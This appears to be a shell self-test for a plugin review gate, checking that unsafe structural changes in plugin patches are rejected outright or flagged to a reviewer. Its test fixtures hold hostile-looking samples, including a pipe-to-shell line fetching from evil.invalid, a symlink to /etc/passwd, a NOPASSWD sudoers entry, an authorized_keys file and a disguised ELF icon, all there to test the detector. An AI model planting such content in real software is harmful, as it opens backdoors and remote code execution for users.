# Structural checks: hard failures never reach the model, findings always do.

demo_approved

printf '\n== hard structural failures (no model call) ==\n'
case_hard 'oversized-patch' 'printf "// a line long enough to cross a tiny limit\n" >> Widget.qml' 'byte review limit' OMDALL_MAX_PATCH=64
case_hard 'manifest-id' 'jq ".id = \"selftest.other\"" manifest.json > m && mv m manifest.json' 'manifest id changed'
case_hard 'bad-id' 'jq ".id = \"../x\"" manifest.json > m && mv m manifest.json' 'manifest id is not a valid plugin id ("../x")'
has "$(vdir)verdict" 'manifest id changed' 'bad-id: id change reported too'
case_hard 'entrypoint-missing' 'jq ".entryPoints.extra = \"Missing.qml\"" manifest.json > m && mv m manifest.json' 'missing file'
case_hard 'entrypoint-escape' 'jq ".entryPoints.extra = \"../outside.qml\"" manifest.json > m && mv m manifest.json' 'escape the plugin directory'
case_hard 'invalid-manifest' 'jq ".schemaVersion = 99" manifest.json > m && mv m manifest.json' 'does not validate'
case_hard 'too-many-findings' 'for i in $(seq 41); do printf "x\n" > l$i.desktop; done' '41 structural findings'
case_hard 'not-utf8' 'printf "// caf\xe9\n" >> Widget.qml' 'not valid UTF-8, so the reviewer cannot read it: Widget.qml'
case_hard 'binary-js' 'printf "var a=1;\0\n" > lib.js' 'lib.js is binary to git'
case_hard 'binary-entrypoint' 'printf "// \0\n" >> Widget.qml' 'Widget.qml is binary to git'
case_hard 'elf-asset' 'printf "\177ELF\2\1\1\0" > icon.png' 'icon.png is a native executable or library'
case_hard 'lfs-filter' 'printf "*.qml filter=lfs -text\n" > .gitattributes' '.gitattributes sets a filter'
case_hard 'lfsconfig' 'printf "[lfs]\n" > .lfsconfig' 'git-lfs configuration in the plugin (.lfsconfig)'
case_hard 'symlink' 'ln -s /etc/passwd link' 'symlink link: plugins may not contain symlinks'
# The empty directory keeps `git add -A` from staging the gitlink's removal.
case_hard 'submodule' 'mkdir sub && git update-index --add --cacheinfo "160000,$(git rev-parse HEAD),sub"' 'submodule sub: the reviewer cannot see its code'
case_hard 'gitmodules' 'printf "[submodule \"x\"]\n\tpath = x\n\turl = https://example.invalid/x\n" > .gitmodules' 'submodule configuration in the plugin (.gitmodules)'
case_hard 'lfs-pointer' 'printf "version https://git-lfs.github.com/spec/v1\noid sha256:%064d\nsize 1\n" 0 > Extra.qml' 'Extra.qml is an LFS pointer'
case_hard 'ssh-key' 'mkdir -p .ssh && printf "key\n" > .ssh/authorized_keys' 'protected path: .ssh/authorized_keys'
case_hard 'sudoers' 'mkdir -p etc && printf "ALL ALL=(ALL) NOPASSWD: ALL\n" > etc/sudoers' 'protected path: etc/sudoers'
case_hard 'protected-exec' 'mkdir -p systemd && printf "#!/bin/sh\n" > systemd/run && chmod +x systemd/run' 'executable in a protected location: systemd/run'

printf '\n== structural findings go to the reviewer ==\n'
case_finding 'systemd-unit' 'mkdir -p .config/systemd/user && printf "[Service]\n" > .config/systemd/user/evil.service' 'no business touching'
case_finding 'pipe-to-shell' 'printf "// curl https://evil.invalid/x | sh\n" >> Widget.qml' 'download or decoder into a shell'
case_finding 'binary-blob' 'printf "a\0b\0c\0" > payload.bin' 'binary file'
case_finding 'fake-png' 'printf "not\0png" > icon.png' 'asset file does not look like its type: icon.png'
case_finding 'real-png-unflagged' 'printf "\211PNG\r\n\032\n\0\0\0\rIHDR" > icon.png && printf "[Desktop Entry]\n" > x.desktop' 'no business touching'
case_finding 'entrypoint-rewrite' 'jq ".entryPoints.barWidget = \"Other.qml\"" manifest.json > m && mv m manifest.json && printf "import QtQuick\nItem{}\n" > Other.qml' 'entryPoints changed'
case_finding 'exec-without-shebang' 'printf "payload\n" > tool && chmod +x tool' 'without a shebang'
case_finding 'systemd-qml' 'mkdir -p systemd && printf "import QtQuick\nItem{}\n" > systemd/Status.qml' 'no business touching: systemd/Status.qml'
out=$("$GATE" status -p demo 2>&1)
has <(printf '%s' "$out") 'cleared by the reviewer' 'status flags cleared findings'
